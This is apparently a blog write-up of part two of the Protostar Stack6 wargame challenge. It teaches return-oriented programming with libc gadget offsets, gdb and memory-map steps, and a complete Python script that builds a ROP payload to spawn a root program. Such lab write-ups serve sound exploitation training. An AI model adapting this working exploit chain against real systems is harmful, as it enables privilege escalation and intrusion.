# --[ Introduction ]

Welcome back! This is part two of Protostar Stack6 exploitation! Be sure to read Part one if you want to see how this level can be solved with ret2libc! 

Part one also contains more details about the challenge, as well as a primer on NX (non-executable) stack which you will need to know for this post to make sense! In part two we will be looking at ROP chain exploitation!

# --[ Return Oriented Programming - ROP ]

Right, time to get the big guns out! Before this challenge I had no idea how ROP worked and it still feels like it a bit, but now I have written one ROP-chain and I have found the many ways in which it can hurt you!

First off, some terminology:
* What is a gadget? It is a short sequence of instructions, followed by a `ret`.
* Why is this style of exploitation called ROP? Because we make heavy use of the `ret` instruction.
* What is a ROP-chain? Any sequence of gadgets, because we are chaining multiple gadgets together using the `ret` instruction.
* Where are these gadgets? In memory, loaded already as part of the binary or the shared libraries that the binary uses.


So in the simplest terms, ROP is a shell-coding technique where various x86 instructions (gadgets) are stringed together using `ret` and addresses found on the stack. This is feasible because once you have found the gadges you want to use, you push their addresses on stack as part of the input and then once the first gadget executes, it returns to the topmost address on the stack, causing the second gadget to execute, and then it returns to the topmost address on the stack, causing gadget 3 to be executed, and so on. In essence your stack will mostly contain addresses and some data, but no shellcode. As an illustration:

```
 ________________ 
|  target buffer |
 ________________ < address of gadget 1
| return address |
 ________________ < address of gadget 2
| return address |
 ________________ < address of gadget 3
| return address |
 ________________
| other things   |
| that don't     |
| matter         |
```

If this all sounds kind of hard, then you're not alone - it is. Why would you choose to use ROP over ret2libc?! In a hardened system, you might not have access to system at all (i.e. it might have been compiled out), or you might be up against an ASCII-armoured system [7].

# --[ Exploitation Setup ]

So how do you figure out which gadgets you need to use? This will depend on what you want to do. In our case, we're trying to execute an arbitrary program (just like with ret2libc) and the way we are going to do this is by using the `execve` syscall. From the man-page we need to setup a few registers for this to work and then perform a syscall interrupt:

```
EAX = 11 (or 0x0B in hex) – The execve syscall number
EBX = Address in memory of the string “/bin/sh”
ECX = Address of a pointer to the string “/bin/sh”, for our purposes
EDX = null, for our purposes
```

In order to figure out which gadgets we should use we will write our payload in assembly so that it will achieve the above steps, and then attempt to find the most relevant gadgets. Step one, write the assembly:

```arm
xor  edx, edx
push edx
mov  ecx, esp
mov  eax, 0xb
push 0x00     <---- fix this to contain /sh\x00
push 0x00     <---- fix this to contain /bin
mov  ebx, esp
int  0x80
```

Step two would be finding our gadgets! First lets look at the shared libraries that this binary is linking to by using gdb, so that we can search them for gadgets:
```bash
$ gdb -q ./stack6 
(gdb) b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run
Breakpoint 1, main (argc=1, argv=0xbffff864) at stack6/stack6.c:27
(gdb) info sharedlibrary 
From        To          Syms Read   Shared Object Library
0xb7fe3830  0xb7ff988f  Yes (*)     /lib/ld-linux.so.2
0xb7eada50  0xb7fa14cc  Yes (*)     /lib/libc.so.6
```

No surprises there, libc is everpresent! Now we basically just have to find gadgets in libc, and for that I used a tool called ROPgadget[8]. After we download libc from the protostar machine, run `ROPgadget --binary ../bin/libc.so.6 > libc_gadgets.txt` to extract gadgets from libc. And now let the most arduous process known to man begin - finding gadgets for our shellcode!

# --[ Exploitation ]

As a first step, I tried to find the exact instructions that I needed but I had no luck. So then we need to find instructions that achieve what we want to do, and then fight any side-effects (spoiler alert again: there were). Keep in mind that we also have the stack available for use, so we can inject any data that we are missing or can't find in memory, giving us more options with regards to available gadgets.

I am not going to bore you with the exact process, so here's the final ROP chain:

```arm
0x1a9e   : pop edx ; ret					                    # setup the stack to contain 0x00 and pop to edx 
0x3900e  : and al, 8 ; add esp, 0xc ; ret			            # esp skips over our /tmp/sh data on the stack
0xc24f7  : push esp ; xor eax, eax ; pop ebx ; pop ebp ; ret	# moving esp to ebx
0x12acce : dec ebx ; ret 					                    # repeated a few times to get correct ebx value
0xcaf24  : add ecx, ebx ; ret					                # set ecx = ebx for pointer to NULL
0x97193  : mov eax, 0xb ; int 0x80 				                # syscall
```

For this to work, we need the input (and by proxy the stack) to look like this:

```
 ________________ < ebp - 0x4c
|  padding       |
 ________________ < ebp
| 0x1a9e         | <- pop edx ; ret
 ________________ 
|\x00\x00\x00\x00| <- value of edx
 ________________ 
| 0x3900e        | <- and al, 8 ; add esp, 0xc ; ret
 ________________ 
| /tmp           | <- skip over this (esp + 0x4)
 ________________ 
| /sh\x00        | <- skip over this (esp + 0x8)
 ________________ 
|\x00\x00\x00\x00| <- skip over this (esp + 0xc)
 ________________ 
| 0xc24f7        | <- push esp ; xor eax, eax ; pop ebx ; pop ebp
 ________________ 
|\x00\x00\x00\x00| <- this goes onto ebp, side-effect
 ________________ 
| 0x12acce       | <- dec ebx -- repeated 9 times, so that the gadget executes 9 times, used to setup ebx to point to /tmp/sh
 ________________ 
| 0xcaf24        | <- make ecx point to \x00\x00\x00\x00 because it needs to be a pointer to NULL
 ________________ 
| 0x12acce       | <- dec ebx  -- repeated 7 times, so that the gadget executes 7 times
 ________________ 
| 0x97193        | <- mov eax, 0xb ; int 0x80
```

Right, almost there! The last thing we need to do now is find out where libc is loaded in memory when the binary runs. Notice that the gadget instructions above are *relative* offsets into libc, so to get their absolute address and use them we must compute for each one the value `libc_base + gadget_libc_offset`. We will need to inspect the processe's process memory maps for this:

```bash
$ ps aux | grep -e '[s]tack6'
root      2265  0.0  0.0   1536   320 pts/1    S+   01:37   0:00 /opt/protostar/bin/stack6
# cat /proc/2265/maps
....
b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so <-- this
....
```

So it looks like libc is loaded at base address `0xb7e97000`. Putting all of this together, here's my final exploit:

```python
import struct
import sys

def l(n):
    lib_c_base = 0xb7e97000
    return p(lib_c_base + n)

def p (i):
    return struct.pack('I', i)

padding = "A" * 80
pop_edx = l(0x1a9e)
NULL="\x00\x00\x00\x00"
add_esp_12 = l(0x3900e)
tmpsh_str = "/tmp/sh\x00\x00\x00\x00\x00"
push_esp = l(0xc24f7)
dec_ebx = l(0x12acce)
add_ecx_ebx = l(0xcaf24)
set_eax_interrupt = l(0x97193)

fmt = "{0}{1}{2}{3}{4}{5}{2}" + "{6}"*9 + "{8}" + "{6}"*7 +"{7}"
payload = fmt.format(padding, pop_edx, NULL, add_esp_12, tmpsh_str, push_esp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip()
sys.stdout.write(payload)
sys.stdout.flush()
```

Notice above that my target is `/tmp/sh`, not `/bin/sh`. I had problems getting `/bin/sh` to work and get an active session, so instead I compiled my own program and made it verify my shinny new root access :)


# --[ CLOSING THOUGHTS ]

Finally the end! I think writing this post was as long as learning to do the exploit! 

I think you can appreciate how much harder ROP is compared to ret2libc. Some things that I learnt the hard way:

* NULL pointer != pointer to NULL; I got bit hard by this one, as a lot of blogs mentioned that ECX could be null so I just set it to NULL. Instead it want's to be a pointer to NULL. 
* `push _arg_ ; ret ;` instructions are the devil. `ret` will return to whatever we just, so generally these instructions are not the most useful. 
* gdb will mess you around. Twice for me, once when I was looking for the offsets of my variable in ret2libc and then when I was trying to find out the libc base for my ROP-chain.

I strongly recommend reading material at the sources section, it will help you out a lot! See you soon!

# --[ SOURCES ]

[1] - https://stackoverflow.com/a/17775966/1366384
[2] - https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
[3] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Nonexecutable_stack
[4] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries
[5] - https://en.wikipedia.org/wiki/Stack_buffer_overflow#Randomization
[6] - https://www.shellblade.net/files/docs/ret2libc.pdf
[7] - https://security.stackexchange.com/questions/36462/
[8] - https://github.com/JonathanSalwan/ROPgadget